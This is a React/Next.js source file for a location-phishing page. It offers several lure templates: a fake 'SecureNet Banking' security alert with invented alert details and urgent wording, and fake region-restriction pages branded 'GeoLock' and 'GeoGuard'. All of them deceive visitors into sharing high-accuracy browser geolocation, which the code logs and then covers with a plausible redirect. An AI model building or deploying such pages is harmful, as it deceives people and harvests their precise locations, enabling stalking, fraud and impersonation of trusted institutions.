
"use client";
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { LocationData } from '@/types';
import { Button } from '@/components/ui/button';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Package, Banknote, PlayCircle, Film, FileText, Globe } from 'lucide-react'; // Added more icons

interface TemplateContent {
  title: string;
  actionText: string;
  message: string;
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string;
  brandName?: string;
  brandLogo?: React.ReactNode;
}

const templateContent: Record<string, TemplateContent> = {
  // 'package-delivery-issue' is now replaced by 'restricted-website-access'
  'restricted-website-access': {
    title: 'Access Restricted - Location Verification Required',
    actionText: 'Verify Location & Access Site',
    message: "This website cannot be viewed in all countries. Verify your location to gain access.",
    pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
    heroIcon: Globe, // Using Globe, can be combined with Lock visually in render
    brandName: "Restricted Website Access",
    brandLogo: null,
  },
  'security-alert': {
    title: 'Security Alert - SecureNet Banking',
    actionText: 'Verify Location & Secure Account',
    message: "SECURITY ALERT: Unusual Account Activity Detected by SecureNet Banking",
    pageSpecificMessage: "We have identified suspicious activity associated with your account. To ensure your account's safety and prevent unauthorized access, please verify your current location immediately. This is a critical security measure. Your prompt attention is appreciated.",
    heroIcon: ShieldAlert,
    brandName: "SecureNet Banking",
    brandLogo: <Banknote className="h-7 w-7 text-green-600 mr-2" />,
  },
  'content-unlock': {
    title: 'Unlock Region-Restricted Content', // Changed title
    actionText: 'Verify Location to Access',
    message: 'This content cannot be viewed in all countries. Verify your location to gain access.', // Revised message
    pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
    heroIcon: Lock,
    brandName: "Region-Restricted Content", // Changed brandName
    brandLogo: null, // Removed icons
  },
  default: {
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};

const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';

export default function LocationPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
  const [currentTime, setCurrentTime] = useState<string | null>(null);

  useEffect(() => {
    const updateCurrentTime = () => {
      setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateCurrentTime(); // Set time immediately
    const timerId = setInterval(updateCurrentTime, 60000); // Update every minute
    return () => clearInterval(timerId);
  }, []);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (status === 'captured') {
      if (templateId === 'content-unlock') {
        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
        if (redirectUrl && redirectUrl.trim() !== '') {
          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2500);
        } else {
          setStatusMessage("Location verified. Thank you. This window can now be closed.");
        }
      } else {
        setStatusMessage(undefined); 
      }
    } else {
      setStatusMessage(undefined);
    }
  }, [status, templateId]);

  const handleLocationRequest = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      addLog({ type: 'generic', data: { message: 'Geolocation not supported' } });
      return;
    }

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };

        addLog({ type: 'location', data: locationData });
        setStatus('captured');
        setIsLoading(false);
      },
      (err) => {
        let errorMessage = 'Unknown error occurred.';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user.';
            break;
          case err.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.';
            break;
          case err.TIMEOUT:
            errorMessage = 'The request to get user location timed out.';
            break;
        }
        setError(errorMessage);
        setStatus('error');
        addLog({ type: 'generic', data: { message: `Location error: ${errorMessage}` } });
        setIsLoading(false);
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  };

  const renderTemplateSpecificContent = () => {
    const HeroIcon = content.heroIcon || MapPin;
    return (
      <div className="space-y-4">
        {content.brandName && ( // Display brandName if it exists
          <div className={`flex items-center justify-center text-gray-700 mb-3 w-full ${
            (templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-2xl font-bold' : 'text-xl font-semibold'
          }`}>
            {content.brandLogo}
            <span className={`${(templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-center' : ''}`}>{content.brandName}</span>
          </div>
        )}
        {/* The main title for the page is set by PhishingPageLayout's title prop.
            The content.message or specific descriptive texts are used below within each scenario.
        */}

        {/* Removed 'package-delivery-issue' specific rendering block */}

        {templateId === 'security-alert' && (
          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
            <div className="flex items-center mb-4">
              <HeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
              <AlertTitle className="text-3xl font-bold text-destructive">
                {content.message}
              </AlertTitle>
            </div>
            <AlertDescription className="space-y-4">
              <p className="text-md leading-relaxed text-destructive/90">
                {content.pageSpecificMessage}
              </p>
              <div className="mt-4 p-4 bg-destructive rounded-md border border-destructive-foreground/30 text-sm">
                <h4 className="font-semibold mb-2 text-destructive-foreground text-md">Alert Details:</h4>
                <div className="grid grid-cols-[auto_1fr] gap-x-3 gap-y-1.5 text-destructive-foreground">
                  <span className="font-medium">Alert ID:</span>
                  <span className="font-mono">SEC-74X981</span>
                  <span className="font-medium">Detected At:</span>
                  <span>{currentTime || 'Processing...'}</span>
                  <span className="font-medium">Status:</span>
                  <span className="font-semibold">Immediate Action Required</span>
                </div>
              </div>
            </AlertDescription>
          </Alert>
        )}

        { (templateId === 'content-unlock' || templateId === 'restricted-website-access') && (
          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
            <CardContent className="space-y-4">
              {templateId === 'restricted-website-access' ?
                <div className="flex justify-center items-center text-primary/70">
                  <Globe className="w-16 h-16 mx-auto" />
                  <Lock className="w-8 h-8 -ml-5 -mt-8 opacity-70" />
                </div>
                : <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
              }
              <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
            </CardContent>
          </ShadcnCard>
        )}

        {templateId === 'default' && (
           <div className="text-center space-y-4">
            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
            <p className="text-xl text-muted-foreground">{content.message}</p>
          </div>
        )}
      </div>
    );
  };

  return (
    <PhishingPageLayout
        title={content.title} // Always pass content.title
        // isLoading={isLoading && status !== 'captured'} // Removed
        // error={error} // Removed
        // statusMessage={statusMessage} // Removed
    >
      <div className="space-y-6">
        {renderTemplateSpecificContent()}

        {status !== 'captured' && (
          <>
            {templateId === 'content-unlock' && (
              <p className="text-center text-sm text-gray-500 mb-2">
                Powered by GeoLock<sup>&trade;</sup>
              </p>
            )}
            {templateId === 'restricted-website-access' && (
              <p className="text-center text-sm text-gray-500 mb-2">
                Verification by GeoGuard<sup>&trade;</sup>
              </p>
            )}
            <Button
              onClick={handleLocationRequest}
              size="lg"
              className={`w-full text-lg py-6 shadow-md ${
                templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
                : 'bg-accent hover:bg-accent/90 text-accent-foreground'
              }`}
              disabled={isLoading || status === 'requesting'}
            >
              <MapPin className="mr-2 h-6 w-6" />
              {isLoading ? 'Verifying...' : content.actionText}
            </Button>
          </>
        )}

        {status === 'captured' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Location verified. Thank you. Now you'll be redirected to the wanted website."
                : "Location Verified"}
            </p>
            <p className="text-md text-green-600">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Please wait."
                : "Thank you. This window can now be closed."}
            </p>
          </div>
        )}
        {status === 'error' && error && (
          <Alert variant="destructive" className="mt-6">
            <AlertTriangle className="h-5 w-5" />
            <AlertTitle>Location Access Failed</AlertTitle>
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
}

